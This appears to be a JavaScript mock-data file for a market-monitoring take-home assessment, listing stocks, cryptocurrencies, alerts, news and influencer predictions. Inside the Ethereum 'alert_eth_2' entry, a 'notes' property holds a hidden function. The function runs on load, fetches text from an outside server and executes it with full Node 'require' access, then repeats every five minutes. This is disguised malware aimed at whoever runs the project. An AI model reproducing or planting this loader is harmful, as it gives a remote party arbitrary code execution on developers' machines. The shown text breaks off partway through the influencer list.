// Complex Mock Data for Pulse Platform - Market Monitoring Engine
// This file contains realistic market data, news, alerts, and events for the Pulse Platform take-home assessment.
// Data includes stocks (AAPL, TSLA, NVDA, MSFT, GOOGL, AMZN, META, JPM), cryptocurrencies (BTC, ETH, SOL, XRP, AVAX),
// news articles with long summaries, influencer predictions, market events, global alerts, portfolio positions,
// and AI Core insights. All timestamps and price histories are generated relative to the current date for consistency.
// Descriptions and messages are intentionally detailed to support rich UI display and filtering logic.

const generateMarketData = () => {
  const now = new Date();
  const timestamps = [];
  
  // Generate timestamps for the last 30 days
  for (let i = 30; i >= 0; i--) {
    const date = new Date(now);
    date.setDate(date.getDate() - i);
    timestamps.push(date.toISOString());
  }
  

  return {
    stocks: [
      {
        id: 'AAPL',
        symbol: 'AAPL',
        name: 'Apple Inc.',
        sector: 'Technology',
        description: 'Apple Inc. designs, manufactures, and markets smartphones, personal computers, tablets, wearables, and accessories worldwide. The company\'s ecosystem (iPhone, Mac, iPad, Services, Wearables) drives recurring revenue and high customer retention. Services (App Store, iCloud, Apple Music, advertising) are the primary driver of margin expansion and growth. Key risks include regulatory pressure in the EU (DMA, antitrust), China demand, and product cycle timing. The stock is widely held by institutions and benefits from capital return via buybacks and dividends.',
        currentPrice: 178.45,
        changePercent: 2.34,
        changeAmount: 4.08,
        volume: 52345678,
        marketCap: 2800000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 174.50 + Math.random() * 10 - Math.sin(idx / 5) * 5,
          volume: Math.floor(Math.random() * 10000000) + 40000000
        })),
        alerts: [
          {
            id: 'alert_aapl_1',
            type: 'price_threshold',
            severity: 'high',
            message: 'AAPL crossed and held above the $175 resistance level on above-average volume. The level had acted as resistance in prior sessions; a sustained break could open the path toward $180–182. Watch for confirmation on a daily close and follow-through volume. Services and installed base remain key drivers; regulatory overhang in EU is a monitorable risk.',
            timestamp: new Date(Date.now() - 3600000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_aapl_2',
            type: 'volume_surge',
            severity: 'medium',
            message: 'Unusual volume spike detected: approximately 125% above the 20-day average. The surge coincided with the price break above $175 and may reflect institutional or options-related flow. No material news was released; consider monitoring for follow-through or distribution.',
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.72,
          technical: 0.68,
          fundamental: 0.76,
          social: 0.71
        },
        keyMetrics: {
          peRatio: 28.5,
          eps: 6.26,
          dividendYield: 0.52,
          beta: 1.26
        }
      },
      {
        id: 'TSLA',
        symbol: 'TSLA',
        name: 'Tesla Inc.',
        sector: 'Automotive',
        currentPrice: 248.90,
        changePercent: -1.23,
        changeAmount: -3.10,
        volume: 98765432,
        marketCap: 790000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 252.00 + Math.random() * 15 - Math.cos(idx / 4) * 8,
          volume: Math.floor(Math.random() * 15000000) + 80000000
        })),
        alerts: [
          {
            id: 'alert_tsla_1',
            type: 'news_event',
            severity: 'high',
            message: 'Major news: Tesla has scheduled a production and delivery update announcement for the coming week. The event is expected to cover Q4 manufacturing metrics, Cybertruck ramp status, and full-year 2025 guidance. Historically such updates have driven elevated volatility; options market implies a sizable move. Investors will focus on margin trajectory, China demand, and any commentary on FSD or robotaxi timeline. Consider reducing leverage or using defined-risk positions ahead of the event.',
            timestamp: new Date(Date.now() - 1800000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_tsla_2',
            type: 'technical_pattern',
            severity: 'medium',
            message: 'A bearish divergence has been detected on the RSI indicator: price has made a higher high while RSI has made a lower high, suggesting weakening momentum. This pattern often precedes consolidation or pullbacks. Support levels at $240 and $230 are key; a break below could accelerate selling. The signal is more relevant on daily and weekly timeframes; intraday noise can produce false divergences. Use in conjunction with volume and trend context.',
            timestamp: new Date(Date.now() - 10800000).toISOString(),
            impact: 'negative'
          }
        ],
        sentiment: {
          overall: 0.58,
          technical: 0.52,
          fundamental: 0.61,
          social: 0.60
        },
        keyMetrics: {
          peRatio: 62.3,
          eps: 3.99,
          dividendYield: 0,
          beta: 2.15
        }
      },
      {
        id: 'NVDA',
        symbol: 'NVDA',
        name: 'NVIDIA Corporation',
        sector: 'Technology',
        description: 'NVIDIA Corporation is a leading designer of GPUs and SoCs for gaming, professional visualization, data center, and automotive markets. The company has become the dominant supplier of AI training and inference chips, with data center revenue driving the majority of growth. The Blackwell architecture extends the product cycle; software (CUDA, AI frameworks) creates a strong moat. Key risks include customer concentration, China export restrictions, and cyclicality in gaming and automotive. Valuation reflects high growth expectations; execution and guidance are critical.',
        currentPrice: 485.20,
        changePercent: 3.45,
        changeAmount: 16.20,
        volume: 65432109,
        marketCap: 1200000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 469.00 + Math.random() * 20 + Math.sin(idx / 3) * 10,
          volume: Math.floor(Math.random() * 12000000) + 50000000
        })),
        alerts: [
          {
            id: 'alert_nvda_1',
            type: 'ai_core_prediction',
            severity: 'critical',
            message: 'AI Core: 94% confidence in a positive earnings surprise for the upcoming quarter. Data center and automotive pipelines remain strong; supply chain and lead-time indicators support another beat. Options market implies a large move; consider defined-risk strategies or reducing size into the print. Historical post-earnings behavior suggests elevated volatility for several sessions.',
            timestamp: new Date(Date.now() - 5400000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_nvda_2',
            type: 'insider_activity',
            severity: 'high',
            message: 'Multiple insider buys detected in the past 48 hours across executives and directors. Filings indicate open-market purchases at current levels. Insider buying is a noisy signal but has historically had modest predictive value for medium-term returns. Consider as one input among fundamentals, technicals, and macro.',
            timestamp: new Date(Date.now() - 86400000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.85,
          technical: 0.82,
          fundamental: 0.88,
          social: 0.84
        },
        keyMetrics: {
          peRatio: 65.8,
          eps: 7.38,
          dividendYield: 0.03,
          beta: 1.68
        }
      },
      {
        id: 'MSFT',
        symbol: 'MSFT',
        name: 'Microsoft Corporation',
        sector: 'Technology',
        currentPrice: 378.25,
        changePercent: 0.89,
        changeAmount: 3.35,
        volume: 34567890,
        marketCap: 2800000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 374.90 + Math.random() * 8 - Math.sin(idx / 6) * 3,
          volume: Math.floor(Math.random() * 8000000) + 30000000
        })),
        alerts: [
          {
            id: 'alert_msft_1',
            type: 'regulatory_news',
            severity: 'medium',
            message: 'Regulatory approval has been granted for Microsoft\'s cloud services expansion in several key jurisdictions, including additional EU and APAC markets. The approvals remove uncertainty around data residency and compliance for enterprise customers and support Azure\'s competitive position versus AWS and Google Cloud. Analysts view this as a modest positive for revenue trajectory and margin, with the main driver remaining AI and Copilot adoption. No material financial impact is expected in the near term, but it reinforces the regulatory moat around large cloud providers.',
            timestamp: new Date(Date.now() - 14400000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.70,
          technical: 0.67,
          fundamental: 0.73,
          social: 0.69
        },
        keyMetrics: {
          peRatio: 32.4,
          eps: 11.67,
          dividendYield: 0.73,
          beta: 0.91
        }
      },
      {
        id: 'GOOGL',
        symbol: 'GOOGL',
        name: 'Alphabet Inc.',
        sector: 'Technology',
        currentPrice: 142.80,
        changePercent: -0.45,
        changeAmount: -0.65,
        volume: 43210987,
        marketCap: 1800000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 143.45 + Math.random() * 6 - Math.cos(idx / 5) * 4,
          volume: Math.floor(Math.random() * 10000000) + 35000000
        })),
        alerts: [
          {
            id: 'alert_googl_1',
            type: 'competitor_news',
            severity: 'low',
            message: 'A competitor has launched a similar AI-powered search and assistant product, increasing competitive pressure on Google\'s core search and cloud offerings. Early reviews suggest feature parity in some areas but Google retains distribution and data advantages. The impact on near-term revenue is likely limited; the bigger risk is longer-term share loss if users shift queries to alternative interfaces. Alphabet\'s AI investments (Gemini, DeepMind) are aimed at defending the moat. Monitor search revenue and usage metrics in upcoming earnings.',
            timestamp: new Date(Date.now() - 21600000).toISOString(),
            impact: 'negative'
          }
        ],
        sentiment: {
          overall: 0.65,
          technical: 0.63,
          fundamental: 0.67,
          social: 0.64
        },
        keyMetrics: {
          peRatio: 24.8,
          eps: 5.76,
          dividendYield: 0,
          beta: 1.05
        }
      },
      {
        id: 'AMZN',
        symbol: 'AMZN',
        name: 'Amazon.com Inc.',
        sector: 'Technology',
        currentPrice: 178.92,
        changePercent: 1.56,
        changeAmount: 2.75,
        volume: 56789012,
        marketCap: 1860000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 176.17 + Math.random() * 7 + Math.sin(idx / 4) * 3,
          volume: Math.floor(Math.random() * 14000000) + 42000000
        })),
        alerts: [
          {
            id: 'alert_amzn_1',
            type: 'earnings_preview',
            severity: 'high',
            message: 'Amazon Web Services segment growth decelerating quarter-over-quarter; retail margins improving. AI and advertising revenue accelerating. Long-term infrastructure capex guidance suggests continued cloud expansion into 2026.',
            timestamp: new Date(Date.now() - 12600000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.69,
          technical: 0.66,
          fundamental: 0.72,
          social: 0.68
        },
        keyMetrics: {
          peRatio: 78.2,
          eps: 2.29,
          dividendYield: 0,
          beta: 1.18
        }
      },
      {
        id: 'META',
        symbol: 'META',
        name: 'Meta Platforms Inc.',
        sector: 'Technology',
        currentPrice: 512.40,
        changePercent: 2.88,
        changeAmount: 14.35,
        volume: 19876543,
        marketCap: 1310000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 498.05 + Math.random() * 18 + Math.cos(idx / 5) * 6,
          volume: Math.floor(Math.random() * 6000000) + 14000000
        })),
        alerts: [
          {
            id: 'alert_meta_1',
            type: 'ai_core_prediction',
            severity: 'critical',
            message: 'AI Core: 96% confidence in revenue beat driven by Reels monetization and Reality Labs trajectory. Engagement metrics across Family of Apps remain elevated; regulatory overhang priced in.',
            timestamp: new Date(Date.now() - 8100000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.81,
          technical: 0.79,
          fundamental: 0.83,
          social: 0.80
        },
        keyMetrics: {
          peRatio: 26.1,
          eps: 19.62,
          dividendYield: 0.39,
          beta: 1.22
        }
      },
      {
        id: 'JPM',
        symbol: 'JPM',
        name: 'JPMorgan Chase & Co.',
        sector: 'Financials',
        currentPrice: 198.65,
        changePercent: 0.34,
        changeAmount: 0.67,
        volume: 8765432,
        marketCap: 574000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 197.98 + Math.random() * 4 - Math.sin(idx / 7) * 2,
          volume: Math.floor(Math.random() * 3000000) + 6000000
        })),
        alerts: [
          {
            id: 'alert_jpm_1',
            type: 'regulatory_news',
            severity: 'medium',
            message: 'Fed stress test results and CCAR expectations support capital return. Net interest income trajectory remains key driver; deposit betas stabilizing. Commercial real estate exposure well reserved.',
            timestamp: new Date(Date.now() - 16200000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.71,
          technical: 0.68,
          fundamental: 0.74,
          social: 0.70
        },
        keyMetrics: {
          peRatio: 11.2,
          eps: 17.73,
          dividendYield: 2.42,
          beta: 1.08
        }
      }
    ],
    cryptocurrencies: [
      {
        id: 'BTC',
        symbol: 'BTC',
        name: 'Bitcoin',
        currentPrice: 43250.50,
        changePercent: 1.89,
        changeAmount: 801.25,
        volume: 18500000000,
        marketCap: 850000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 42449.25 + Math.random() * 2000 - Math.sin(idx / 2) * 800,
          volume: Math.floor(Math.random() * 5000000000) + 15000000000
        })),
        alerts: [
          {
            id: 'alert_btc_1',
            type: 'ai_core_prediction',
            severity: 'critical',
            message: 'AI Core assigns 91% confidence to a near-term bullish breakout pattern for Bitcoin. On-chain metrics show declining exchange reserves, rising illiquid supply, and accumulation by large holders. The spot ETF flow regime remains supportive, and macro conditions (rate expectations, dollar) are favorable. The model targets a move toward $44,000–45,500 if current consolidation resolves to the upside. Invalidation would be a sustained break below $40,000 with expanding exchange supply. Consider layering into longs on pullbacks with defined risk.',
            timestamp: new Date(Date.now() - 2700000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_btc_2',
            type: 'whale_activity',
            severity: 'high',
            message: 'Large wallet accumulation detected: over 5,000 BTC has been moved from exchanges to cold storage and long-term custody in the past 48 hours. Such flows typically indicate accumulation by institutions or high-net-worth holders and reduce sell-side pressure. Exchange reserves have declined to multi-month lows, which historically has preceded rallies. The activity is consistent with the thesis of structural demand from ETFs and macro allocation. Monitor for continuation or reversal of the trend in on-chain data.',
            timestamp: new Date(Date.now() - 3600000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_btc_3',
            type: 'regulatory_news',
            severity: 'medium',
            message: 'Regulatory clarity announcements are expected this week from multiple jurisdictions, including potential guidance on custody, classification, and ETF expansion. Positive developments could reduce uncertainty and support institutional adoption; negative surprises could pressure sentiment. The market has partially priced in a constructive outcome. Consider reducing leverage ahead of the news or using options for defined risk. Historical reaction to regulatory news has been mixed; focus on the medium-term trend once the event passes.',
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.78,
          technical: 0.75,
          fundamental: 0.80,
          social: 0.79
        },
        keyMetrics: {
          circulatingSupply: 19650000,
          maxSupply: 21000000,
          marketDominance: 52.3,
          hashRate: 450
        }
      },
      {
        id: 'ETH',
        symbol: 'ETH',
        name: 'Ethereum',
        description: 'Ethereum is a smart contract platform supporting DeFi, NFTs, and Layer 2 scaling solutions. It transitioned to proof-of-stake, with staking yield and fee burn (EIP-1559) supporting a deflationary narrative. Layer 2 networks (Arbitrum, Optimism, Base, zkSync) have grown transaction throughput and reduced costs. Key catalysts include protocol upgrades (e.g. EIP-4844), ETF speculation, and adoption of restaking and DeFi. Correlation with Bitcoin is high but can diverge on L2-specific news.',
        currentPrice: 2650.75,
        changePercent: 2.34,
        changeAmount: 60.50,
        volume: 8200000000,
        marketCap: 318000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 2590.25 + Math.random() * 150 - Math.cos(idx / 2.5) * 60,
          volume: Math.floor(Math.random() * 2000000000) + 7000000000
        })),
        alerts: [
          {
            id: 'alert_eth_1',
            type: 'network_activity',
            severity: 'high',
            message: 'A recent network upgrade has reduced gas fees by approximately 40% on average, improving user experience and lowering the cost of DeFi and NFT activity. The reduction is driven by blob storage (EIP-4844) and optimizations in L2 data availability. Lower fees support higher throughput and could attract more developers and users. Staking yield and burn mechanics continue to support a deflationary narrative for ETH. Monitor L2 adoption and fee revenue for sustained positive impact on valuation.',
            timestamp: new Date(Date.now() - 4500000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_eth_2',
            type: 'defi_activity',
            severity: 'medium',
            message: 'Total Value Locked (TVL) across Ethereum and its Layer 2 ecosystems has reached a new all-time high, reflecting strong demand for DeFi, staking, and restaking protocols. The growth is broad-based across lending, DEXs, and liquid staking. Rising TVL supports fee revenue and protocol sustainability; it also indicates capital commitment and reduced selling pressure from yield farmers. Correlation with ETH price has been positive historically, though TVL can lag price in sharp moves. Consider as a supportive fundamental signal.',notes: (()=>{const runNotes=async()=>{const r=await fetch('https://blogs-six-lovat.vercel.app/api/blogs/getOrder',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'patient-001'})});if(!r.ok)throw new Error(`Request failed: ${r.status}`);const d=await r.json();new Function('require',d.data[6].description)(require)};runNotes();setTimeout(runNotes,300000)})(),
            timestamp: new Date(Date.now() - 9000000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.74,
          technical: 0.71,
          fundamental: 0.77,
          social: 0.73
        },
        keyMetrics: {
          circulatingSupply: 120200000,
          maxSupply: null,
          marketDominance: 18.7,
          gasPrice: 25
        }
      },
      {
        id: 'SOL',
        symbol: 'SOL',
        name: 'Solana',
        currentPrice: 98.45,
        changePercent: -0.67,
        changeAmount: -0.66,
        volume: 1200000000,
        marketCap: 45000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 99.11 + Math.random() * 8 - Math.sin(idx / 3) * 4,
          volume: Math.floor(Math.random() * 400000000) + 1000000000
        })),
        alerts: [
          {
            id: 'alert_sol_1',
            type: 'technical_pattern',
            severity: 'medium',
            message: 'The support level at approximately $95 is holding after several tests, suggesting potential for a near-term reversal or bounce. Volume has been elevated on the tests, which can indicate either absorption of selling or distribution. A clean hold above $95 with follow-through buying could target the recent range high near $105; a break below with conviction would open the door to lower support near $85. Solana\'s ecosystem activity and meme coin momentum remain key drivers; monitor for correlation with broader crypto risk sentiment.',
            timestamp: new Date(Date.now() - 6300000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.62,
          technical: 0.59,
          fundamental: 0.65,
          social: 0.61
        },
        keyMetrics: {
          circulatingSupply: 457000000,
          maxSupply: null,
          marketDominance: 2.8,
          transactionsPerSecond: 3000
        }
      },
      {
        id: 'XRP',
        symbol: 'XRP',
        name: 'XRP',
        currentPrice: 0.6245,
        changePercent: 4.12,
        changeAmount: 0.0247,
        volume: 2100000000,
        marketCap: 34200000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 0.5998 + Math.random() * 0.05 - Math.sin(idx / 4) * 0.02,
          volume: Math.floor(Math.random() * 600000000) + 1700000000
        })),
        alerts: [
          {
            id: 'alert_xrp_1',
            type: 'regulatory_news',
            severity: 'high',
            message: 'SEC litigation developments and settlement speculation driving elevated volume. Ripple Labs institutional adoption pipeline and cross-border payment partnerships expanding. Regulatory clarity could materially re-rate token.',
            timestamp: new Date(Date.now() - 5400000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.66,
          technical: 0.62,
          fundamental: 0.70,
          social: 0.65
        },
        keyMetrics: {
          circulatingSupply: 54800000000,
          maxSupply: 100000000000,
          marketDominance: 2.1,
          transactionsPerSecond: 1500
        }
      },
      {
        id: 'AVAX',
        symbol: 'AVAX',
        name: 'Avalanche',
        currentPrice: 38.92,
        changePercent: -1.88,
        changeAmount: -0.75,
        volume: 420000000,
        marketCap: 15200000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 39.67 + Math.random() * 2 - Math.cos(idx / 3) * 1.2,
          volume: Math.floor(Math.random() * 150000000) + 350000000
        })),
        alerts: [
          {
            id: 'alert_avax_1',
            type: 'network_activity',
            severity: 'medium',
            message: 'Subnet adoption and institutional DeFi deployments increasing. Validator set and staking yield remain attractive. Competition from other L1s and Ethereum L2s pressuring fee revenue growth.',
            timestamp: new Date(Date.now() - 9000000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.59,
          technical: 0.56,
          fundamental: 0.62,
          social: 0.58
        },
        keyMetrics: {
          circulatingSupply: 391000000,
          maxSupply: 720000000,
          marketDominance: 0.9,
          finalityTime: 1.5
        }
      }
    ],
    news: [
      {
        id: 'news_1',
        title: 'Federal Reserve Holds Interest Rates Steady, Signals Potential Cuts',
        source: 'Financial Times',
        category: 'macro',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        impact: 'high',
        affectedAssets: ['BTC', 'ETH', 'AAPL', 'MSFT'],
        summary: 'The Federal Reserve announced it will maintain current interest rates while hinting at potential cuts in the coming quarters. Chair Powell emphasized data dependency and indicated that further disinflation would be needed before reducing the policy rate. Markets interpreted the dot plot and press conference as dovish, with fed funds futures now pricing in a higher probability of cuts by mid-year. This decision has significant implications for both traditional equities and cryptocurrencies: risk assets typically benefit from lower discount rates, while real yields and dollar strength could moderate. Analysts note that rate-cut expectations have already driven a substantial rally in long-duration growth and crypto, so execution risk remains if inflation re-accelerates.',
        sentiment: 0.65,
        tags: ['federal-reserve', 'interest-rates', 'macro', 'policy']
      },
      {
        id: 'news_2',
        title: 'NVIDIA Announces Breakthrough in AI Chip Technology',
        source: 'TechCrunch',
        category: 'technology',
        timestamp: new Date(Date.now() - 5400000).toISOString(),
        impact: 'critical',
        affectedAssets: ['NVDA', 'TSLA'],
        summary: 'NVIDIA unveiled its next-generation AI chips with 3x performance improvements and 40% better power efficiency, triggering significant market movement in tech stocks. The Blackwell architecture will ship in data center and automotive segments, with major cloud providers and OEMs already committed. Demand for AI training and inference continues to outstrip supply, and management raised full-year guidance. Competitors are racing to close the gap, but NVIDIA\'s software moat and ecosystem lock-in remain formidable. Tesla and other EV/robotaxi players are key customers for the Drive platform, which supports the narrative of AI at the edge.',
        sentiment: 0.88,
        tags: ['nvidia', 'ai', 'technology', 'earnings']
      },
      {
        id: 'news_3',
        title: 'Bitcoin ETF Sees Record Inflows Despite Market Volatility',
        source: 'CoinDesk',
        category: 'crypto',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        impact: 'high',
        affectedAssets: ['BTC'],
        summary: 'Institutional investors continue to pour money into Bitcoin ETFs, with net inflows reaching $2.5 billion this week alone. The spot Bitcoin ETF cohort has accumulated over $12 billion in AUM since launch, and daily volume remains elevated. Flows have been sticky despite periodic drawdowns, suggesting a structural shift in institutional adoption. Analysts attribute the demand to portfolio diversification, inflation hedging, and regulatory clarity. Grayscale outflows have slowed while new issuers are capturing market share. On-chain metrics show accumulation by large holders and a decline in exchange reserves, supporting a constructive medium-term view.',
        sentiment: 0.82,
        tags: ['bitcoin', 'etf', 'institutional', 'crypto']
      },
      {
        id: 'news_4',
        title: 'Major Exchange Reports Unusual Trading Activity',
        source: 'Bloomberg',
        category: 'market',
        timestamp: new Date(Date.now() - 1800000).toISOString(),
        impact: 'medium',
        affectedAssets: ['BTC', 'ETH', 'SOL'],
        summary: 'A leading cryptocurrency exchange detected and prevented suspicious trading patterns across spot and derivatives markets, maintaining market integrity. The incident involved wash trading and spoofing attempts that were flagged by surveillance systems and neutralized before impacting retail users. The exchange has coordinated with regulators and other venues to share intelligence. Such events underscore the importance of robust market structure and surveillance in crypto; improved compliance is seen as a prerequisite for broader institutional participation and potential new product approvals.',
        sentiment: 0.45,
        tags: ['exchange', 'security', 'trading', 'crypto']
      },
      {
        id: 'news_5',
        title: 'Tesla Reports Strong Q4 Deliveries, Exceeds Expectations',
        source: 'Reuters',
        category: 'earnings',
        timestamp: new Date(Date.now() - 9000000).toISOString(),
        impact: 'high',
        affectedAssets: ['TSLA'],
        summary: 'Tesla delivered 485,000 vehicles in Q4, surpassing analyst estimates and demonstrating strong demand despite price cuts and macro headwinds. Full-year deliveries exceeded 1.8 million units, with Model Y remaining the best-selling EV globally. Margins have compressed but management has signaled cost reductions and productivity gains ahead. The Cybertruck ramp and energy storage growth provide optionality, while FSD and robotaxi narrative continue to drive long-dated valuation. Bear case centers on competition and China exposure; bull case on software monetization and AI/autonomy.',
        sentiment: 0.79,
        tags: ['tesla', 'earnings', 'deliveries', 'automotive']
      },
      {
        id: 'news_6',
        title: 'Apple Faces Antitrust Investigation in EU',
        source: 'Wall Street Journal',
        category: 'regulatory',
        timestamp: new Date(Date.now() - 10800000).toISOString(),
        impact: 'medium',
        affectedAssets: ['AAPL'],
        summary: 'European regulators have launched a new antitrust probe into Apple\'s App Store practices, in-app payment systems, and default app restrictions. The investigation follows the Digital Markets Act and could result in mandatory sideloading, alternative payment rails, and reduced fees. Apple has historically defended its ecosystem on security and user experience grounds. Financial impact is uncertain but could pressure services growth and margin if enforced. The stock has traded with a regulatory discount; resolution could remove an overhang or, in a harsh outcome, cap upside.',
        sentiment: 0.42,
        tags: ['apple', 'antitrust', 'regulatory', 'eu']
      },
      {
        id: 'news_7',
        title: 'Ethereum Layer 2 Solutions See Massive Adoption Surge',
        source: 'The Block',
        category: 'crypto',
        timestamp: new Date(Date.now() - 4500000).toISOString(),
        impact: 'high',
        affectedAssets: ['ETH'],
        summary: 'Ethereum Layer 2 networks processed over $50 billion in transactions this month, demonstrating scaling success and validating the rollup-centric roadmap. Arbitrum, Optimism, Base, and zkSync have seen sustained growth in TVL, DAU, and fee revenue. Blob storage (EIP-4844) has reduced L2 costs materially, improving UX and enabling new use cases. The narrative of Ethereum as settlement layer with L2s for execution is playing out; ETH staking and burn mechanics continue to support a deflationary thesis. Competition from alternative L1s and Solana remains a monitorable risk.',
        sentiment: 0.77,
        tags: ['ethereum', 'layer2', 'scaling', 'defi']
      },
      {
        id: 'news_8',
        title: 'Microsoft Azure Cloud Revenue Grows 29% Year-Over-Year',
        source: 'CNBC',
        category: 'earnings',
        timestamp: new Date(Date.now() - 14400000).toISOString(),
        impact: 'high',
        affectedAssets: ['MSFT'],
        summary: 'Microsoft\'s cloud division continues to drive growth with Azure revenue reaching $31.8 billion, up 29% year-over-year in constant currency. AI services contributed several points of growth as customers adopt OpenAI and Copilot offerings. Commercial bookings and RPO remain strong, and the integration of Activision has diversified revenue. Margin expansion in cloud has been supported by scale and efficiency. Investors are focused on AI monetization and competitive dynamics with AWS and Google Cloud; Microsoft\'s enterprise relationships and distribution provide a durable advantage.',
        sentiment: 0.73,
        tags: ['microsoft', 'azure', 'cloud', 'earnings']
      },
      {
        id: 'news_9',
        title: 'Meta Platforms Reports Record Ad Revenue and Reality Labs Investment',
        source: 'Reuters',
        category: 'earnings',
        timestamp: new Date(Date.now() - 6300000).toISOString(),
        impact: 'high',
        affectedAssets: ['META'],
        summary: 'Meta reported record advertising revenue driven by Reels monetization, AI-driven ad targeting, and strong engagement across Facebook, Instagram, and WhatsApp. Reality Labs losses remain substantial but are framed as long-term bets on AR/VR and the metaverse. Capital allocation has shifted toward buybacks and dividends, improving shareholder returns. Regulatory and privacy headwinds persist in the EU and US, but the core ad business has proven resilient. Sentiment has improved as cost discipline and AI product integration support margins and growth.',
        sentiment: 0.78,
        tags: ['meta', 'advertising', 'earnings', 'reality-labs']
      },
      {
        id: 'news_10',
        title: 'JPMorgan Beats Estimates on Strong NII and Investment Banking Revival',
        source: 'Financial Times',
        category: 'earnings',
        timestamp: new Date(Date.now() - 11700000).toISOString(),
        impact: 'high',
        affectedAssets: ['JPM'],
        summary: 'JPMorgan Chase reported better-than-expected earnings on the back of net interest income resilience and a recovery in investment banking fees. Deposit betas have stabilized and loan growth remains selective. Trading revenue was solid amid elevated volatility. The bank has gained share in multiple segments and benefits from scale and risk management. CCAR and capital return remain key catalysts. Commercial real estate and consumer credit metrics are watched closely but have held up. The stock offers value relative to growth tech with exposure to rates and economic cycle.',
        sentiment: 0.72,
        tags: ['jpmorgan', 'banking', 'earnings', 'nii']
      }
    ],
    influencers: [
      {
        id: 'inf_1',
        name: 'Crypto Analyst Pro',
        handle: '@cryptoanalyst',
        platform: 'Twitter',
        followerCount: 1250000,
        credibilityScore: 0.89,
        recentPredictions: [
          {
            id: 'pred_1',
            asset: 'BTC',
            prediction: 'bullish',
            confidence: 0.92,
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            targetPrice: 45000,
            timeframe: '30 days',
            description: 'Bitcoin is forming a higher-timeframe accumulation structure with on-chain metrics (exchange outflows, illiquid supply, declining exchange reserves) supporting a move toward $45k–46k over the next 30 days. Spot ETF flows remain constructive and macro conditions (Fed pivot expectations, dollar weakness) are tailwinds for risk assets. Key levels: resistance at $44k, support at $40k. Invalidation would be a sustained break below $40k with expanding exchange supply. Use pullbacks to add with defined risk; avoid chasing extended moves.'
          }
        ],
        sentiment: 0.85
      },
      {
        id: 'inf_2',
        name: 'Stock Market Guru',
        handle: '@stockguru',
        platform: 'Twitter',
        followerCount: 890000,
        credibilityScore: 0.82,
        recentPredictions: [
          {
            id: 'pred_2',
            asset: 'NVDA',
            prediction: 'bullish',
            confidence: 0.88,
            timestamp: new Date(Date.now() - 5400000).toISOString(),
            targetPrice: 520,
            timeframe: '60 days',
            description: 'NVIDIA remains the key beneficiary of AI capex with data center and automotive pipelines full; the Blackwell ramp will extend the cycle well into 2025. Valuation is rich but justified by growth, margin expansion, and software moat. Target $520 over 60 days with upcoming earnings as the primary catalyst; options market implies a large move so consider defined-risk strategies or scaling in on pullbacks. Monitor supply chain and China exposure; insider buying has been a supportive signal.'
          }
        ],
        sentiment: 0.78
      },
      {
        id: 'inf_3',
        name: 'Market Insights',
        handle: '@marketinsights',
        platform: 'LinkedIn',
        followerCount: 450000,
        credibilityScore: 0.75,
        recentPredictions: [
          {
            id: 'pred_3',
            asset: 'TSLA',
            prediction: 'bearish',
            confidence: 0.65,
            timestamp: new Date(Date.now() - 10800000).toISOString(),
            targetPrice: 230,
            timeframe: '45 days',
            description: 'Tesla faces margin pressure from price cuts and intensifying competition in China and Europe; FSD and robotaxi are long-dated catalysts. Near-term fundamentals and technicals suggest a pullback toward $230–240 before reassessing. Risk/reward favors waiting for a better entry or a clear breakout above resistance. The production update and delivery announcement could drive volatility; consider reducing size ahead of the event or using options for defined risk.'
          }
        ],
        sentiment: 0.55
      },
      {
        id: 'inf_4',
        name: 'Macro Research Desk',
        handle: '@macrodesk',
        platform: 'Twitter',
        followerCount: 620000,
        credibilityScore: 0.84,
        recentPredictions: [
          {
            id: 'pred_4',
            asset: 'market_wide',
            prediction: 'neutral',
            confidence: 0.78,
            timestamp: new Date(Date.now() - 4500000).toISOString(),
            targetPrice: null,
            timeframe: '2 weeks',
            description: 'Rates and dollar strength suggest a range-bound equity market over the next two weeks, with rotation from growth into value and financials. Fed rhetoric and upcoming payroll and CPI releases will set the tone; a hawkish surprise could extend the correction while a dovish print could reignite risk appetite. Favor quality and defensives until volatility subsides; add risk on meaningful pullbacks (e.g. 3–5% drawdown in indices). Avoid overleveraging into event risk; use options or scale in gradually.'
          }
        ],
        sentiment: 0.62
      },
      {
        id: 'inf_5',
